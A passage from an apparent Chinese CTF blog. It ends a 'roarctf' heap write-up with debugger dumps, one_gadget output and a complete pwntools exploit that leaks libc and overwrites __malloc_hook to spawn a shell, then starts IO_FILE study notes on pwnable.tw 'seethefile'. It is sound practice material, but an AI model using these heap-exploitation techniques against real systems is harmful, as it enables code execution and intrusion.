&#x27;./roarctf&#x27;</span><br><span class="line">... ↓</span><br><span class="line">12:0090│      0x7ffc37dd4930 ◂— 0x1c1104708</span><br><span class="line">13:0098│      0x7ffc37dd4938 —▸ 0x55fafa1d41ec ◂— push   rbp</span><br><span class="line">14:00a0│      0x7ffc37dd4940 ◂— 0x0</span><br><span class="line">15:00a8│      0x7ffc37dd4948 ◂— 0x21d72319ef57efa6</span><br><span class="line">16:00b0│      0x7ffc37dd4950 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp</span><br><span class="line">17:00b8│      0x7ffc37dd4958 —▸ 0x7ffc37dd49f0 ◂— 0x1</span><br><span class="line">18:00c0│      0x7ffc37dd4960 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">1a:00d0│      0x7ffc37dd4970 ◂— 0x75dab899f897efa6</span><br><span class="line">1b:00d8│      0x7ffc37dd4978 ◂— 0x748956d06527efa6</span><br><span class="line">1c:00e0│      0x7ffc37dd4980 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">1f:00f8│      0x7ffc37dd4998 —▸ 0x7ffc37dd4a08 —▸ 0x7ffc37dd608a ◂— 0<span class="title function_">x52454d554e5f434c</span> <span class="params">(<span class="string">&#x27;LC_NUMER&#x27;</span>)</span></span><br><span class="line">20:0100│      0x7ffc37dd49a0 —▸ 0x7f55c1569168 —▸ 0x55fafa1d3000 ◂— jg     0x55fafa1d3047</span><br><span class="line">21:0108│      0x7ffc37dd49a8 —▸ 0<span class="title function_">x7f55c135280b</span> <span class="params">(_dl_init+<span class="number">139</span>)</span> ◂— jmp    0x7f55c13527e0</span><br><span class="line">22:0110│      0x7ffc37dd49b0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">24:0120│      0x7ffc37dd49c0 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp</span><br><span class="line">25:0128│      0x7ffc37dd49c8 —▸ 0x7ffc37dd49f0 ◂— 0x1</span><br><span class="line">26:0130│      0x7ffc37dd49d0 ◂— 0x0</span><br><span class="line">27:0138│      0x7ffc37dd49d8 —▸ 0x55fafa1d39c9 ◂— hlt    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们来看看onegadegt:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ one_gadget /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> -l3</span><br><span class="line">/var/lib/gems/<span class="number">2.3</span><span class="number">.0</span>/gems/one_gadget<span class="number">-1.6</span><span class="number">.2</span>/lib/one_gadget/fetchers/base.rb:<span class="number">45</span>: warning: Insecure world writable dir /home/giantbranch in PATH, mode <span class="number">040777</span></span><br><span class="line"><span class="number">0x45226</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x30</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4527a</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x30</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x30</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xcd173</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rcx, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [rcx] == <span class="literal">NULL</span> || rcx == <span class="literal">NULL</span></span><br><span class="line">  [r12] == <span class="literal">NULL</span> || r12 == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xcd248</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rax, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [rax] == <span class="literal">NULL</span> || rax == <span class="literal">NULL</span></span><br><span class="line">  [r12] == <span class="literal">NULL</span> || r12 == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xf03a4</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x50</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x50</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xf03b0</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, [rax])</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == <span class="literal">NULL</span> || rsi == <span class="literal">NULL</span></span><br><span class="line">  [[rax]] == <span class="literal">NULL</span> || [rax] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xf1247</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xf67f0</span>	execve(<span class="string">&quot;/bin/sh&quot;</span>, rcx, [rbp<span class="number">-0xf8</span>])</span><br><span class="line">constraints:</span><br><span class="line">  [rcx] == <span class="literal">NULL</span> || rcx == <span class="literal">NULL</span></span><br><span class="line">  [[rbp<span class="number">-0xf8</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0xf8</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个时候我们尝试realloc_hook,mallo_hook 复写为realloc，realloc_hook写为onegadget ,</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  <span class="number">0xcafebabedeadbeef</span></span><br><span class="line"> RBX  <span class="number">0x10</span></span><br><span class="line"> RCX  <span class="number">0x10</span></span><br><span class="line"> RDX  <span class="number">0x7f31162cc02a</span> (<span class="built_in">calloc</span>+<span class="number">682</span>) ◂— xor    esi, esi</span><br><span class="line"> RDI  <span class="number">0x10</span></span><br><span class="line"> RSI  <span class="number">0x55fc4e86dcd1</span> ◂— mov    qword ptr [rbp - <span class="number">0x10</span>], rax</span><br><span class="line"> R8   <span class="number">0x0</span></span><br><span class="line"> R9   <span class="number">0x0</span></span><br><span class="line"> R10  <span class="number">0x0</span></span><br><span class="line"> R11  <span class="number">0x7f31163be6e0</span> (_nl_C_LC_CTYPE_class+<span class="number">256</span>) ◂— add    al, byte ptr [rax]</span><br><span class="line"> R12  <span class="number">0x55fc4e86dcd1</span> ◂— mov    qword ptr [rbp - <span class="number">0x10</span>], rax</span><br><span class="line"> R13  <span class="number">0x7ffedb4e1860</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x10</span></span><br><span class="line"> RSP  <span class="number">0x7ffedb4e16a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RIP  <span class="number">0x7f31162cb95d</span> (<span class="built_in">realloc</span>+<span class="number">589</span>) ◂— call   rax</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x7f31162cb95d</span> &lt;<span class="built_in">realloc</span>+<span class="number">589</span>&gt;    call   rax</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f31162cb95f</span> &lt;<span class="built_in">realloc</span>+<span class="number">591</span>&gt;    mov    rbp, rax</span><br><span class="line">   <span class="number">0x7f31162cb962</span> &lt;<span class="built_in">realloc</span>+<span class="number">594</span>&gt;    jmp    <span class="built_in">realloc</span>+<span class="number">213</span> &lt;<span class="number">0x7f31162cb7e5</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f31162cb967</span> &lt;<span class="built_in">realloc</span>+<span class="number">599</span>&gt;    nop    word ptr [rax + rax]</span><br><span class="line">   <span class="number">0x7f31162cb970</span> &lt;<span class="built_in">realloc</span>+<span class="number">608</span>&gt;    mov    rax, qword ptr [rip + <span class="number">0x33f501</span>]</span><br><span class="line">   <span class="number">0x7f31162cb977</span> &lt;<span class="built_in">realloc</span>+<span class="number">615</span>&gt;    xor    ebp, ebp</span><br><span class="line">   <span class="number">0x7f31162cb979</span> &lt;<span class="built_in">realloc</span>+<span class="number">617</span>&gt;    mov    dword ptr fs:[rax], <span class="number">0xc</span></span><br><span class="line">   <span class="number">0x7f31162cb980</span> &lt;<span class="built_in">realloc</span>+<span class="number">624</span>&gt;    jmp    <span class="built_in">realloc</span>+<span class="number">213</span> &lt;<span class="number">0x7f31162cb7e5</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f31162cb985</span> &lt;<span class="built_in">realloc</span>+<span class="number">629</span>&gt;    nop    dword ptr [rax]</span><br><span class="line">   <span class="number">0x7f31162cb988</span> &lt;<span class="built_in">realloc</span>+<span class="number">632</span>&gt;    lea    rax, [r15 - <span class="number">8</span>]</span><br><span class="line">   <span class="number">0x7f31162cb98c</span> &lt;<span class="built_in">realloc</span>+<span class="number">636</span>&gt;    mov    rbp, rbx</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7ffedb4e16a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7ffedb4e16b0</span> —▸ <span class="number">0x7f311681c700</span> ◂— <span class="number">0x7f311681c700</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7ffedb4e16b8</span> ◂— <span class="number">9</span> <span class="comment">/* &#x27;\t&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7ffedb4e16c0</span> —▸ <span class="number">0x7f311660c6a3</span> (_IO_2_1_stdout_+<span class="number">131</span>) ◂— <span class="number">0x60d780000000000a</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7ffedb4e16c8</span> —▸ <span class="number">0x7ffedb4e1860</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7ffedb4e16d0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">7f</span>31162cb95d <span class="built_in">realloc</span>+<span class="number">589</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>31162cc02a <span class="built_in">calloc</span>+<span class="number">682</span></span><br><span class="line">   f <span class="number">2</span>     <span class="number">55f</span>c4e86dcd1</span><br><span class="line">   f <span class="number">3</span>        <span class="number">74e86</span>d9a0</span><br><span class="line">   f <span class="number">4</span>        <span class="number">100000010</span></span><br><span class="line">   f <span class="number">5</span>        <span class="number">100000006</span></span><br><span class="line">   f <span class="number">6</span> <span class="number">54</span>a26cc778083a00</span><br><span class="line">   f <span class="number">7</span>     <span class="number">7f</span>fedb4e1780</span><br><span class="line">   f <span class="number">8</span>     <span class="number">55f</span>c4e86e258</span><br><span class="line">   f <span class="number">9</span>        <span class="number">1</span>db4e1860</span><br><span class="line">   f <span class="number">10</span> <span class="number">54</span>a26cc778083a00</span><br><span class="line">Program received signal <span class="title function_">SIGSEGV</span> <span class="params">(fault address <span class="number">0x0</span>)</span></span><br><span class="line">pwndbg&gt; <span class="built_in">stack</span> 20</span><br><span class="line">00:0000│ rsp  0x7ffedb4e16a0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">02:0010│      0x7ffedb4e16b0 —▸ 0x7f311681c700 ◂— 0x7f311681c700</span><br><span class="line">03:0018│      0x7ffedb4e16b8 ◂— 9 <span class="comment">/* &#x27;\t&#x27; */</span></span><br><span class="line">04:0020│      0x7ffedb4e16c0 —▸ 0<span class="title function_">x7f311660c6a3</span> <span class="params">(_IO_2_1_stdout_+<span class="number">131</span>)</span> ◂— 0x60d780000000000a <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line">05:0028│      0x7ffedb4e16c8 —▸ 0x7ffedb4e1860 ◂— 0x1</span><br><span class="line">06:0030│      0x7ffedb4e16d0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">08:0040│      0x7ffedb4e16e0 ◂— 0x10</span><br><span class="line">09:0048│      0x7ffedb4e16e8 —▸ 0x55fc4e86d9a0 ◂— xor    ebp, ebp</span><br><span class="line">0a:0050│      0x7ffedb4e16f0 —▸ 0x7ffedb4e1860 ◂— 0x1</span><br><span class="line">0b:0058│      0x7ffedb4e16f8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">0d:0068│      0x7ffedb4e1708 —▸ 0<span class="title function_">x7f31162cc02a</span> <span class="params">(<span class="built_in">calloc</span>+<span class="number">682</span>)</span> ◂— xor    esi, esi</span><br><span class="line">0e:0070│      0x7ffedb4e1710 ◂— 0x7</span><br><span class="line">0f:0078│      0x7ffedb4e1718 ◂— 0x0</span><br><span class="line">10:0080│      0x7ffedb4e1720 —▸ 0x7ffedb4e1760 —▸ 0x7ffedb4e1780 —▸ 0x55fc4e86e2c0 ◂— push   r15</span><br><span class="line">11:0088│      0x7ffedb4e1728 —▸ 0x55fc4e86d9a0 ◂— xor    ebp, ebp</span><br><span class="line">12:0090│      0x7ffedb4e1730 —▸ 0x7ffedb4e1860 ◂— 0x1</span><br><span class="line">13:0098│      0x7ffedb4e1738 —▸ 0x55fc4e86dcd1 ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">pwndbg&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里rsp+0x30为0，就满足了一个onegadget.</p>
<p>有时候realloc仍旧无法满足，那么我们尝试realloc偏移，realloc调栈 的原理在于其调用realloc_hook前，会有多个push操作，利用这个可以是默写栈空间经过操作偏移后，满足要求。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,29287)</span></span><br><span class="line">r=process(<span class="string">&quot;./roarctf&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./roarctf&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">i</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">	ch(<span class="number">1</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	ch(<span class="number">2</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	r.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	ch(<span class="number">4</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):	</span><br><span class="line">	ch(<span class="number">3</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">gdb.attach(r,<span class="string">&#x27;b calloc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\xb0&#x27;</span>)</span><br><span class="line">write(<span class="number">2</span>,<span class="number">0x18</span>+<span class="number">10</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xb0</span>)+<span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">offset = <span class="number">0x7f99de237b88</span>-<span class="number">0x7f99dde73000</span></span><br><span class="line">libc_base = addr -(<span class="number">0x7f99de237b88</span>-<span class="number">0x7f99dde73000</span>)+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base+<span class="number">0x3c4b10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;malloc_hook : &quot;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"><span class="comment">#onegadget = 0xcafebabedeadbeef</span></span><br><span class="line">onegadget = <span class="number">0x4527a</span>+libc_base</span><br><span class="line">realloc = libc_base+ libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;main_arena : &quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="number">1</span>,<span class="number">0x88</span>+<span class="number">10</span>,p64(<span class="number">0</span>)*<span class="number">17</span>+<span class="string">b&#x27;\x71&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="number">3</span>,<span class="number">0x10</span>,p64(malloc_hook-<span class="number">0x23</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x13</span>-<span class="number">8</span>)+p64(onegadget)</span><br><span class="line">payload +=p64(realloc)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x60</span>-<span class="built_in">len</span>(payload)) </span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write(<span class="number">6</span>,<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable_seethefile</title>
    <url>/2022/03/19/pwnable-seethefile/</url>
    <content><![CDATA[<p>这篇文章主要是在简单的记录小猫在学习IO_FILE时候遇到的一些问题。借用pwnable.tw题目seethefile</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p  *(struct _IO_FILE_plus *)0x804c410</span><br><span class="line">gdb调FILE_PLUS结构体，可以是地址，也可以是stdin等</span><br></pre></td></tr></table></figure>

<p>32位程序：</p>
<ol>
<li><h3 id="question"><a href="#question" class="headerlink" title="question"></a>question</h3><p>open打开文件fp，在未读取数据时候，plus_file 结构体中一部分数据是空的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">21</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72539000</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">3</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">0</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时我们看到程序开始有一个很大的堆块</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x804c000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">1033</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">不知道这块区域的具体作用，可能是缓存区</span><br></pre></td></tr></table></figure>

<p>当我们通过fp读取数据后，会在对快中开启一个新的空间来储存内容。上述堆块会被更新，内容是我们读入文件名，而plus_file的read以及write部分的指针会指向新开辟的堆块中的数据区域</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">22</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72538984</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x804d570</span> <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">3</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x804c000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">1033</span>, </span><br><span class="line">  fd = <span class="number">0x74730a32</span>, </span><br><span class="line">  bk = <span class="number">0x7478742e</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0xa</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x804c408</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">353</span>, </span><br><span class="line">  fd = <span class="number">0xfbad2498</span>, </span><br><span class="line">  bk = <span class="number">0x804c570</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x804c570</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x804c570</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x804c568</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">4105</span>, </span><br><span class="line">  fd = <span class="number">0x61616161</span>, </span><br><span class="line">  bk = <span class="number">0x61616161</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x61616161</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0xa6161</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><em><strong>Q1:_IO_read_ptr 等几个指针有神吗作用？</strong></em></p>
<p>分别对应什么函数功能？为什么修改后，fread不起作用了</p>
<p><em><strong>Q2:IO_buf_end -_IO_buf_base &#x3D; 0x1000为什么偏移量是0x1000</strong></em>，内容堆块大小为0x1008</p>
</li>
<li><h3 id="分析——-IO-FILE-plusneide一些内容"><a href="#分析——-IO-FILE-plusneide一些内容" class="headerlink" title="分析——__IO_FILE_plusneide一些内容"></a>分析——__IO_FILE_plusneide一些内容</h3><p>_flags FILE结构体的一些状态；_markers为指向markers结构体的指针变量，为一个单向链表结构，存放流的位置；_chain变量为一个链表的指针，进程中创建的FILE结构体会通过这个变量连成一个单向链表；</p>
